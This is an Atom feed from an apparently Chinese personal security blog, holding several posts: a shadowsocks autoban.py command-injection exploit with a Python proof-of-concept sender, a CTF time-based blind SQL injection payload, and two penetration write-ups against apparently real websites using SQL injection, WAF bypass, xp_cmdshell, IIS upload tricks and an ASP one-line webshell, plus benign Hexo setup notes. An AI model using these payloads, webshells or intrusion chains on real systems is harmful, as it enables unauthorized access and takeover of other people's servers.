<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Unothing</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://unothing.github.io/"/>
  <updated>2018-05-03T13:36:01.609Z</updated>
  <id>https://unothing.github.io/</id>
  
  <author>
    <name>Unothing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>shadowsocks远程命令执行</title>
    <link href="https://unothing.github.io/2017/11/24/ss-rat/"/>
    <id>https://unothing.github.io/2017/11/24/ss-rat/</id>
    <published>2017-11-24T13:51:36.000Z</published>
    <updated>2018-05-03T13:36:01.609Z</updated>
    
    <content type="html"><![CDATA[<p>利用条件：</p><ol><li>靶机上的<code>shadowsocks</code>是从<code>github</code>上<code>clone</code>的</li><li>靶机开启了<code>autoban.py</code>脚本</li></ol><hr><p>问题出在<code>shadowsocks-master/utils/autoban.py</code>中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line"># Copyright (c) 2015 clowwindy</div><div class="line">#</div><div class="line"># Permission is hereby granted, free of charge, to any person obtaining a copy</div><div class="line"># of this software and associated documentation files (the &quot;Software&quot;), to deal</div><div class="line"># in the Software without restriction, including without limitation the rights</div><div class="line"># to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</div><div class="line"># copies of the Software, and to permit persons to whom the Software is</div><div class="line"># furnished to do so, subject to the following conditions:</div><div class="line">#</div><div class="line"># The above copyright notice and this permission notice shall be included in</div><div class="line"># all copies or substantial portions of the Software.</div><div class="line">#</div><div class="line"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</div><div class="line"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</div><div class="line"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</div><div class="line"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</div><div class="line"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</div><div class="line"># OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</div><div class="line"># SOFTWARE.</div><div class="line"></div><div class="line">from __future__ import absolute_import, division, print_function, \</div><div class="line">    with_statement</div><div class="line"></div><div class="line">import os</div><div class="line">import sys</div><div class="line">import argparse</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    parser = argparse.ArgumentParser(description=&apos;See README&apos;)</div><div class="line">    parser.add_argument(&apos;-c&apos;, &apos;--count&apos;, default=3, type=int,</div><div class="line">                        help=&apos;with how many failure times it should be &apos;</div><div class="line">                             &apos;considered as an attack&apos;)</div><div class="line">    config = parser.parse_args()</div><div class="line">    ips = &#123;&#125;</div><div class="line">    banned = set()</div><div class="line">    for line in sys.stdin:</div><div class="line">        if &apos;can not parse header when&apos; in line:</div><div class="line">            ip = line.split()[-1].split(&apos;:&apos;)[-2]</div><div class="line">            if ip not in ips:</div><div class="line">                ips[ip] = 1</div><div class="line">                print(ip)</div><div class="line">                sys.stdout.flush()</div><div class="line">            else:</div><div class="line">                ips[ip] += 1</div><div class="line">            if ip not in banned and ips[ip] &gt;= config.count:</div><div class="line">                banned.add(ip)</div><div class="line">                cmd = &apos;iptables -A INPUT -s %s -j DROP&apos; % ip</div><div class="line">                print(cmd, file=sys.stderr)</div><div class="line">                sys.stderr.flush()</div><div class="line">                os.system(cmd)</div></pre></td></tr></table></figure></p><p>从sys.stdin读取输入，然后判断是否包含<code>can not parse header when</code>字样，如果有就进行截断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip = line.split()[-1].split(&apos;:&apos;)[-2]</div></pre></td></tr></table></figure></p><p><code>split()</code>是采用默认空格为分隔符<br>当同一个<code>ip</code>出现的次数超过了设定的值（默认为3）,就会直接把它代入执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if ip not in banned and ips[ip] &gt;= config.count:</div><div class="line">                banned.add(ip)</div><div class="line">                cmd = &apos;iptables -A INPUT -s %s -j DROP&apos; % ip</div><div class="line">                print(cmd, file=sys.stderr)</div><div class="line">                sys.stderr.flush()</div><div class="line">                os.system(cmd)</div></pre></td></tr></table></figure></p><hr><p>在靶机<code>192.168.32.51</code>上<br>下载<code>github</code>上的<code>shadowsocks</code>，使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/server.py -p 12345 -k 12345 --log-file /tmp/ss.log -d start</div></pre></td></tr></table></figure></p><p>即可开启ss的服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-p端口</div><div class="line">-k口令</div><div class="line">--log-file日志文件</div><div class="line">-d start后台启动</div></pre></td></tr></table></figure></p><p>客户端可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/local.py -s 192.168.32.51 -p 12345 -l 8090 -k 12345</div></pre></td></tr></table></figure></p><p>登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-s服务器地址</div><div class="line">-p服务器端口</div><div class="line">-l本地端口</div><div class="line">-k服务器登录口令</div></pre></td></tr></table></figure></p><p>也可采用加载本地配置文件的方式启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/local.py -c /etc/shadowsocks.json</div></pre></td></tr></table></figure></p><p>发现客户端对发送内容加密后才发送的。</p><p>ss服务器在接收到客户端发送过来的请求后，会对请求进行解析。关键解析函数<code>shadowsocks/common.py</code>中<code>parse_header(data)</code>函数在判断请求目标地址类型为域名后，会将其写入日志文件。</p><p>根据前面的分析，<code>payload</code>中是不能出现空格和<code>:</code>的，<code>:</code>可以避免，但是想执行命令，空格是必须的。<br>这里使用Linux中自带的IFS环境变量产生空格。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IFS(Internal Field Seprator)，即内部域分隔符，完整定义是“The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substituioin.”。</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IFS=$&apos; \t\n&apos;</div></pre></td></tr></table></figure><p>使用<code>||</code>和<code>${}</code>，尝试写入一个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">can not parse header when ||echo$&#123;IFS%??&#125;&apos;hacked！&apos;&gt;testhahaha.txt:\n</div></pre></td></tr></table></figure></p><p>现在只需模拟客户端，把<code>payload</code>写到请求地址中就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># coding:utf-8</div><div class="line">import socket</div><div class="line">import sys,os</div><div class="line">sys.path.insert(0, os.path.join(os.path.dirname(__file__), &apos;../&apos;))</div><div class="line">import cryptor </div><div class="line"></div><div class="line">head = &quot;&quot;&quot;can not parse header when ||echo$&#123;IFS%??&#125;&apos;hacked！&apos;&gt;testhahaha.txt:\n&quot;&quot;&quot;</div><div class="line">target = (&quot;03%02x%s0050&quot; % (len(head), head.encode(&apos;hex&apos;))).decode(&apos;hex&apos;) # 参考socks5协议, 03表示target是域名，然后两字节域名长度，再是目的地址，最后两字节是port</div><div class="line"></div><div class="line">for i in range(3):</div><div class="line">    c = cryptor.Cryptor(&quot;12345&quot;, &quot;aes-256-cfb&quot;)</div><div class="line">    tosend = c.encrypt(target)</div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((&apos;192.168.32.51&apos;, 12345))</div><div class="line">    s.send(tosend)</div><div class="line">    s.close()</div></pre></td></tr></table></figure></p><p>把这个py文件放入shadowsocks文件夹中运行即可。、</p><p>在服务器端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/utils/autoban.py &lt; /tmp/ss.log</div></pre></td></tr></table></figure></p><p>在当前文件夹下就会生成<code>testhahaha.txt</code>文档,证明命令执行成功</p><p>实际使用时，可以结合<code>curl</code>、<code>wget</code>命令从服务器下载文件，然后反弹shell。</p><hr><p>参考：<br><a href="https://paper.tuisec.win/detail/63207b0184fe59e" target="_blank" rel="external">https://paper.tuisec.win/detail/63207b0184fe59e</a><br><a href="http://foreversong.cn/archives/730" target="_blank" rel="external">http://foreversong.cn/archives/730</a><br><a href="https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/" target="_blank" rel="external">https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/</a><br><a href="https://github.com/shadowsocks/shadowsocks/tree/master" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks/tree/master</a><br><a href="https://www.cnblogs.com/happyhotty/articles/2181522.html" target="_blank" rel="external">SOCKS5协议[rfc1928]</a><br><a href="http://unixboy.iteye.com/blog/499329" target="_blank" rel="external">bash ${ } 用法总结 </a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;利用条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;靶机上的&lt;code&gt;shadowsocks&lt;/code&gt;是从&lt;code&gt;github&lt;/code&gt;上&lt;code&gt;clone&lt;/code&gt;的&lt;/li&gt;
&lt;li&gt;靶机开启了&lt;code&gt;autoban.py&lt;/code&gt;脚本&lt;/li&gt;
&lt;/o
      
    
    </summary>
    
    
      <category term="shadowsocks" scheme="https://unothing.github.io/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>windows日志</title>
    <link href="https://unothing.github.io/2017/11/16/win-log/"/>
    <id>https://unothing.github.io/2017/11/16/win-log/</id>
    <published>2017-11-16T12:03:00.000Z</published>
    <updated>2018-05-03T14:05:12.594Z</updated>
    
    <content type="html"><![CDATA[<p><img src="0.jpg" alt=""><br><img src="1.jpg" alt=""><br><img src="2.jpg" alt=""><br><img src="3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;0.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;2.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="log" scheme="https://unothing.github.io/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>笛卡尔积延时注入</title>
    <link href="https://unothing.github.io/2017/11/15/Mysql-blind-injection/"/>
    <id>https://unothing.github.io/2017/11/15/Mysql-blind-injection/</id>
    <published>2017-11-15T02:18:33.000Z</published>
    <updated>2018-05-03T14:14:33.739Z</updated>
    
    <content type="html"><![CDATA[<p>题目过滤了各种延时函数，当时也考虑过使用某种循环查询产生类似延时的效果，奈何水平不够。看了大佬的WP学到了用笛卡尔积产生延时效果orz</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/?id=1 union select * from OPENQUERY([mysql],&apos;select if(ord(mid((select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 3,1),1,1))=97,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),0)&apos;)</div></pre></td></tr></table></figure></p><p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * from database.tableA,database.tableB</div></pre></td></tr></table></figure></p><p>就会对tableA,B进行笛卡尔运算。<br>例如：<br>tableA：</p><table><thead><tr><th>id</th><th>user</th></tr></thead><tbody><tr><td>1</td><td>a</td></tr><tr><td>2</td><td>b</td></tr></tbody></table><p>tableB：</p><table><thead><tr><th>uid</th><th>name</th></tr></thead><tbody><tr><td>3</td><td>c</td></tr><tr><td>4</td><td>d</td></tr></tbody></table><p>笛卡尔运算的结果：</p><table><thead><tr><th>id</th><th>user</th><th>uid</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>3</td><td>c</td></tr><tr><td>1</td><td>a</td><td>4</td><td>d</td></tr><tr><td>2</td><td>b</td><td>3</td><td>c</td></tr><tr><td>2</td><td>b</td><td>4</td><td>d </td></tr></tbody></table><p>实际测试发现使用<code>information_schema.columns</code>不稳定，因为对于不同的数据库，<code>columns</code>的数量是不同的，太少起不了延时效果，太多可能会导致数据库崩溃。<br>使用<code>character_sets</code>（41行）和<code>collations</code>（222行）效果可能会好点，因为数据量相对计较统一。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT count(*) FROM information_schema.plugins ,information_schema.plugins A,information_schema.collations ,information_schema.collations B;</div><div class="line">+----------+</div><div class="line">| count(*) |</div><div class="line">+----------+</div><div class="line">| 95413824 |</div><div class="line">+----------+</div><div class="line">1 row in set (4.58 sec)</div></pre></td></tr></table></figure></p><p>同名表后面跟着的<code>A</code>,<code>B</code>是别名，不然选取同一个表会报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * from information_schema.plugins,information_schema.plugins;</div><div class="line">ERROR 1066 (42000): Not unique table/alias: &apos;plugins&apos;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目过滤了各种延时函数，当时也考虑过使用某种循环查询产生类似延时的效果，奈何水平不够。看了大佬的WP学到了用笛卡尔积产生延时效果orz&lt;/p&gt;
&lt;p&gt;payload&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas
      
    
    </summary>
    
      <category term="CTF" scheme="https://unothing.github.io/categories/CTF/"/>
    
    
      <category term="blind injection" scheme="https://unothing.github.io/tags/blind-injection/"/>
    
  </entry>
  
  <entry>
    <title>超老站练手</title>
    <link href="https://unothing.github.io/2017/10/27/cep/"/>
    <id>https://unothing.github.io/2017/10/27/cep/</id>
    <published>2017-10-27T07:12:10.000Z</published>
    <updated>2018-05-03T14:15:05.019Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="0x00开始">0x00.开始</span></h3><p>链接<code>http://eaxmple.website/News/NewsList.aspx?blmid=1&amp;slmid=3</code>存在盲注漏洞。扔进Sqlmap，耗时较长，且会出错。</p><p><img src="1.png" alt=""></p><p>此处<code>UserName</code>第一个是<code>admin</code>并不是<code>gdmin</code>。幸好<code>UserPwd</code>没出错。<br><strong>密码看似是BASE64，解完是乱码，需要转换成16进制，提出字符，正好是32位，<a href="https://www.somd5.com/" target="_blank" rel="external">md5解密</a>。</strong></p><p>后台地址<code>/admin/login.aspx</code></p><h3><span id="0x01上传点">0x01.上传点</span></h3><p>Sqlmap扫描很慢，扫描同时扫描了下常用目录。发现<code>FCKeditor</code>上传点。</p><p><img src="2.png" alt=""></p><p><code>http://eaxmple.website/FCKeditor/_whatsnew.html</code>知<code>FCKeditor</code>版本</p><p><img src="3.png" alt=""></p><p>上传点有两个</p><ul><li><code>http://eaxmple.website/fckeditor/editor/filemanager/connectors/test.html</code></li><li><code>http://eaxmple.website/FCKeditor/editor/filemanager/connectors/uploadtest.html</code></li></ul><p>不可直接上传asp，可上传图片，探测知服务器是IIS6.0，有解析漏洞，可上传</p><ul><li><code>1.asp;.jpg</code></li><li><code>1.asp/1.jpg</code></li><li><code>1.asp%00.jpg</code></li></ul><p>等形式的文件绕过限制，有验证文件头的可添加<code>GIF89a</code>绕过。</p><p>但是上传后并没有返回路径，使用自带页面获取<code>current folder</code>，提示没有登录，没有返回任何xml。</p><p>使用<br><code>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</code><br>显示404</p><p>尝试编辑器里上传后的路径<code>/userfiles/image/</code>没有找到文件。</p><p>去找网站里图片的地址<code>/images/xxx.png</code></p><p><strong>这里由于经验少，不知道访问的文件应该是全名<code>1.asp;.jpg</code>，尝试<code>1.asp</code>并没有找到文件，还以为没有上传成功，导致放弃了该路线</strong></p><h3><span id="0x02后台getshell">0x02.后台Getshell</span></h3><p>用解密后的结果登录进后台</p><p>刚开始找到一个图片上传点，限制了文件名必须以图片的后缀名为结尾，并且会重命名：<br><code>1.asp;.jpg</code>就会变成<code>2017xxxxxxxx.jpg</code><br>而且无法添加文件夹，导致该处不能使用。</p><p>看看其他功能，找找有没有可用点。<br>找到编辑器，即<code>FCKeditor</code>。找到上传图片功能，本想着这下能找到上传后的路径。结果发现可直接浏览网站文件。</p><p><img src="4.png" alt=""></p><p>发现自己之前传的shell静静地躺在那。。。。。。</p><p><img src="5.png" alt=""></p><p>不过有意思的是传的<code>1.asp;.jpg</code>变成了<code>1_asp;.jpg</code>,但是重复上传的第二个文件<code>1.asp;(1).jpg</code>并没有变。(FCKeditor特性。。。)<br>而且第一个文件夹应该是前人的shell。。。。。。</p><p>选择文件后，得知路径，直接菜刀连接，Getshell<br><img src="6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;0x00开始&quot;&gt;0x00.开始&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;链接&lt;code&gt;http://eaxmple.website/News/NewsList.aspx?blmid=1&amp;amp;slmid=3&lt;/code&gt;存在盲注漏洞。扔进Sqlmap，耗时较长
      
    
    </summary>
    
      <category term="Pentest" scheme="https://unothing.github.io/categories/Pentest/"/>
    
    
      <category term="SQLInjection" scheme="https://unothing.github.io/tags/SQLInjection/"/>
    
      <category term="FCKeditor" scheme="https://unothing.github.io/tags/FCKeditor/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入练手站</title>
    <link href="https://unothing.github.io/2017/10/23/ya/"/>
    <id>https://unothing.github.io/2017/10/23/ya/</id>
    <published>2017-10-23T13:08:32.000Z</published>
    <updated>2018-05-03T14:15:49.523Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="0x00">0x00</span></h3><p>使用<a href="https://whatweb.net/" target="_blank" rel="external">WhatWeb</a>来获取网站的一些基本信息<br><img src="0.png" alt=""></p><p>对资源列表页面随手进行测试发现存在注入漏洞。</p><p>一般网站可能会对用户输入进行过滤，但是对于自己预置的参数值就会放松警惕，此处的<code>area</code>为影片的国家。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=%E9%A6%99%E6%B8%AF&amp;Category=</div></pre></td></tr></table></figure></p><p><img src="1.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;</div></pre></td></tr></table></figure><p><img src="2.png" alt=""></p><p>尝试<code>order</code>出错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; order by 1;--</div></pre></td></tr></table></figure></p><p><strong>注：<code>--</code>后要接一个空格，或者直接使用<code>#</code>注释符，此处为sqlserver,不能使用<code>#</code></strong></p><p><img src="3.png" alt=""></p><h3><span id="0x01">0x01</span></h3><p>既然能显示错误，那么考虑使用类型转换报错来返回结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and db_name(x)&gt;0;--</div></pre></td></tr></table></figure></p><p><strong><a href="https://technet.microsoft.com/en-us/library/ms189753(v=sql.110).aspx" target="_blank" rel="external">注：<code>x</code>参数可用来选择不同数据库，为空即返回当前数据库名。</a></strong></p><p><img src="4.png" alt=""></p><p>直接猜存在<code>admin</code>表，猜到字段<code>user</code>和<code>pwd</code></p><p>但是突然发现有WAF，过滤了一些关键字。</p><p>多次测试后发现可通过URL编码转换绕过。如：<code>select</code>改变一个<code>e</code>为 URL编码<code>%65</code>，使用<code>s%65lect</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and (s%65lect pwd from admin)&gt;0 --</div></pre></td></tr></table></figure></p><p><img src="5.png" alt=""></p><p>结果不可解。</p><h3><span id="0x02">0x02</span></h3><p>换思路</p><p>考虑命令执行</p><p>直接添加用户，提权，然后远程连接，发现没有成功。</p><p>但是，执行命令又不能直接在页面回显。</p><p>考虑把回显写到表中，然后通过读取表中的内容获得结果。</p><p>建个新表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">CR%65ATE TABLE fileList(line varchar(8000))--</div></pre></td></tr></table></figure></p><p>执行命令，并把结果写入到表中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">IN%53ERT INTO fileList </div><div class="line">  %45XEC xp_cmdshell &apos;whoami&apos;-- #</div></pre></td></tr></table></figure></p><p>直接读取只能读一行，使用<code>FOR XML</code>，可一次性获取全部内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and (S%65LECT * FROM fileList FOR XML AUTO)&gt;0 --</div></pre></td></tr></table></figure></p><p>发现权限不够。</p><h3><span id="0x04">0x04</span></h3><p>不能一步到位，就退而求其次，上个一句话</p><p>一开始想着写在<code>list</code>页面的同一个目录下</p><p>无奈发现，写入后，怎么都找不到。</p><p>经指点知，可能采用的是<code>SVM</code>结构的网站，最有效的写入路径应该是存储图片的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">IN%53ERT INTO fileList   </div><div class="line">  %45XEC xp_cmdshell &apos;echo &lt;%eval request(&quot;pass&quot;)%^&gt;^ &gt; c:\website\Movie\movie\Content\123.asp&apos;--</div></pre></td></tr></table></figure></p><p><strong>注：在cmd中使用<code>&gt;</code>会被解析为输出符号，要想使用必须要用<code>^</code>包裹</strong></p><p>菜刀连接</p><h3><span id="0x05">0x05</span></h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">提权</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;0x00&quot;&gt;0x00&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;使用&lt;a href=&quot;https://whatweb.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WhatWeb&lt;/a&gt;来获取网站的一些基本信息&lt;br&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="Pentest" scheme="https://unothing.github.io/categories/Pentest/"/>
    
    
      <category term="SQLInjection" scheme="https://unothing.github.io/tags/SQLInjection/"/>
    
  </entry>
  
  <entry>
    <title>Hexo</title>
    <link href="https://unothing.github.io/2000/01/01/Hexo/"/>
    <id>https://unothing.github.io/2000/01/01/Hexo/</id>
    <published>1999-12-31T16:00:01.000Z</published>
    <updated>2018-05-05T13:18:50.939Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="0">0</span></h3><p>建议先看<a href="/2000/01/01/Git/">Git</a></p><h3><span id="1安装nodejs">1.安装NodeJs</span></h3><p><a href="https://nodejs.org/en/" target="_blank" rel="external">https://nodejs.org/en/</a></p><h3><span id="2安装hexo">2.安装hexo</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mkdir Myblog</div><div class="line">cd Myblog</div><div class="line"></div><div class="line">npm install -g hexo</div><div class="line">npm install hexo-deployer-git --save</div><div class="line">npm install hexo-generator-feed</div><div class="line">hexo init</div></pre></td></tr></table></figure><p>目录结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">- node_modules  依赖包</div><div class="line">- public    生成页面</div><div class="line">- scaffolds 模板</div><div class="line">- source    文章</div><div class="line">- themes    主题</div><div class="line">    - theme_name</div><div class="line">        - _config.yml  主题配置文件</div><div class="line">- _config.yml   博客配置文件</div><div class="line">- db.json   source解析所得到的</div><div class="line">- package.json  项目所需模块项目的配置信息</div></pre></td></tr></table></figure></p><h3><span id="3配置github">3.配置github</span></h3><p>新建名为<code>yourname.github.io</code>的项目</p><h3><span id="4配置blog">4.配置blog</span></h3><p><strong>注：<code>_config.yml</code>中所有<code>:</code>后都要有个空格！</strong></p><p>修改<code>Myblog/_config.yml</code><br>主要部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"># Site</div><div class="line">title: </div><div class="line">subtitle:</div><div class="line">description:</div><div class="line">author: </div><div class="line">language: zh-CN</div><div class="line"></div><div class="line">#Writing</div><div class="line">post_asset_folder: true     # 添加文章时自动生成同名文件夹用来放图片</div><div class="line"></div><div class="line"># URL</div><div class="line">url: https://yourname.github.io     # github.io分配的域名</div><div class="line"></div><div class="line"># Extensions</div><div class="line">theme: theme_name</div><div class="line">plugin:</div><div class="line">- hexo-generator-feed</div><div class="line">feed:</div><div class="line">    type: atom</div><div class="line">    path: atom.xml</div><div class="line">    limit: 20</div><div class="line"></div><div class="line"># Deployment</div><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repo: git@github.com:yourname/yourname.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure></p><p>修改<code>Myblog/theme/theme_name/_config.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">menu:</div><div class="line">  首页: /#blog</div><div class="line">  关于: /about</div><div class="line">  归档: /archive</div><div class="line">  RSS: /atom.xml</div></pre></td></tr></table></figure></p><h3><span id="5添加文章-页面">5.添加文章、页面</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo new page pagename      # 在source目录下生成pagename目录及pagename/index.md</div><div class="line">hexo new post article      # 在source\_post目录下生成article.md及article文件夹（放置图片）</div><div class="line">    #  hexo new article  ==   hexo new post article</div></pre></td></tr></table></figure><p>由于前面配了<code>post_asset_folder: true</code>在写文章时，只需把图片放到同名文件夹中，引用时无需具体路径直接写图片名即可</p><h3><span id="6部署">6.部署</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hexo clean      #缩写：hexo cl</div><div 